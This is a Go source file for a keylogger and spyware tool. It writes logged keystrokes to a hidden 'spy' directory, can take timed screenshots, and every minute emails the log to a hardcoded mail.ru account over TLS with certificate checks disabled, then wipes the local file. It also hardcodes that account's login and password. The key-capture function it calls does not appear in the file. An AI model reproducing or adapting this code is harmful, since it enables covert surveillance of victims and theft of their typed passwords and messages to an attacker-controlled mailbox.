package main

import (
	"crypto/tls"
	"fmt"
	"image/png"
	"io/ioutil"
	"log"
	"net"
	"net/mail"
	"net/smtp"
	"os"
	"time"

	"github.com/vova616/screenshot"
)

const (
	// Home directory for spy.
	spyhome = "/home/slava/spy/"
	// log file name.
	logFileName = "file.log"
	// Save photo interval.
	savePhotoInterval = 60
	// Send email interval.
	sendEmailInterval = 60
	// Email login
	emailLogin = "pspyware@mail.ru"
	// Email password
	emailPass = "keylogger11"
	// Need to save screen shots?
	isScreenShot = false
)

// Get file contents as string.
func fileGetContents(filename string) string {
	buf, _ := ioutil.ReadFile(filename)
	return string(buf)
}

// Send email.
func sendEmail(subj, body string) {
	from := mail.Address{"", emailLogin}
	to := mail.Address{"", emailLogin}

	// Setup headers
	headers := make(map[string]string)
	headers["From"] = from.String()
	headers["To"] = to.String()
	headers["Subject"] = subj

	// Setup message
	message := ""
	for k, v := range headers {
		message += fmt.Sprintf("%s: %s\r\n", k, v)
	}
	message += "\r\n" + body

	// Connect to the SMTP Server
	servername := "smtp.mail.ru:465"

	host, _, _ := net.SplitHostPort(servername)

	auth := smtp.PlainAuth("", emailLogin, emailPass, host)

	// TLS config
	tlsconfig := &tls.Config{
		InsecureSkipVerify: true,
		ServerName:         host,
	}

	// Here is the key, you need to call tls.Dial instead of smtp.Dial
	// for smtp servers running on 465 that require an ssl connection
	// from the very beginning (no starttls)
	conn, err := tls.Dial("tcp", servername, tlsconfig)
	if err != nil {
		log.Panic(err)
	}

	c, err := smtp.NewClient(conn, host)
	if err != nil {
		log.Panic(err)
	}

	// Auth
	if err = c.Auth(auth); err != nil {
		log.Panic(err)
	}

	// To && From
	if err = c.Mail(from.Address); err != nil {
		log.Panic(err)
	}

	if err = c.Rcpt(to.Address); err != nil {
		log.Panic(err)
	}

	// Data
	w, err := c.Data()
	if err != nil {
		log.Panic(err)
	}

	_, err = w.Write([]byte(message))
	if err != nil {
		log.Panic(err)
	}

	err = w.Close()
	if err != nil {
		log.Panic(err)
	}

	c.Quit()
}

// Get current date format as DD.MM.YYYY
func getCurrentDate() string {
	return time.Now().Format("02.01.2006")
}

// Get current time format as HH:MM:SS
func getCurrentTime() string {
	return time.Now().Local().Format("15:04:05")
}

// Write "" into file.
func clearFileContents(path string) {
	// open file using READ & WRITE permission
	var file, err = os.OpenFile(path, os.O_RDWR|os.O_TRUNC, 0777)
	if err != nil {
		fmt.Println(err)
	}
	defer file.Close()
	// write some text line-by-line to file
	_, err = file.WriteString("")
	if err != nil {
		fmt.Println(err)
	}
	// save changes
	err = file.Sync()
	if err != nil {
		fmt.Println(err)
	}
}

// Send email every {seconds}
func intervalSendEmail(seconds int) {
	for {
		time.Sleep(time.Duration(seconds) * time.Second)
		filepath := spyhome + logFileName // "file_" + getCurrentDate() + ".txt"
		subj := "KeyLogger-" + getCurrentTime()
		body := fileGetContents(filepath)
		if body == "" {
			body = "Empty log file."
		}
		sendEmail(subj, body)
		clearFileContents(filepath)
	}
}

// Capture screenshot every {seconds}
func intervalScreenShot(seconds int) {
	for {
		screenName := spyhome + "screen_" + getCurrentDate() + "_" + getCurrentTime() + ".png"
		makeScreenShot(screenName)
		time.Sleep(time.Duration(seconds) * time.Second)
	}
}

// Make screen shot ans save it as
func makeScreenShot(filename string) {
	img, err := screenshot.CaptureScreen()
	if err != nil {
		panic(err)
	}
	f, err := os.Create(filename)
	if err != nil {
		panic(err)
	}
	err = png.Encode(f, img)
	if err != nil {
		panic(err)
	}
	f.Close()
}

// Append string to file.
func appendIntoFile(filename, content string) {
	// Chech file exists.
	if _, err := os.Stat(filename); os.IsNotExist(err) {
		// Create file for loggin.
		f, err := os.Create(filename)
		if err != nil {
			panic(err)
		}
		defer f.Close()
	}

	file, err := os.OpenFile(filename, os.O_RDWR|os.O_APPEND, 0777)

	if err != nil {
		panic(err)
	}

	if _, err := file.WriteString(content); err != nil {
		panic(err)
	}

	defer file.Close()
}

func main() {
	// Create home directory for spy
	if _, err := os.Stat(spyhome); os.IsNotExist(err) {
		os.Mkdir(spyhome, 0777)
	}

	if isScreenShot {
		// Set screen shot interval
		go intervalScreenShot(savePhotoInterval)
	}

	go intervalSendEmail(sendEmailInterval)

	filename := spyhome + logFileName // "file_" + getCurrentDate() + ".txt"
	LogKeys(filename)
	os.Exit(0)
}
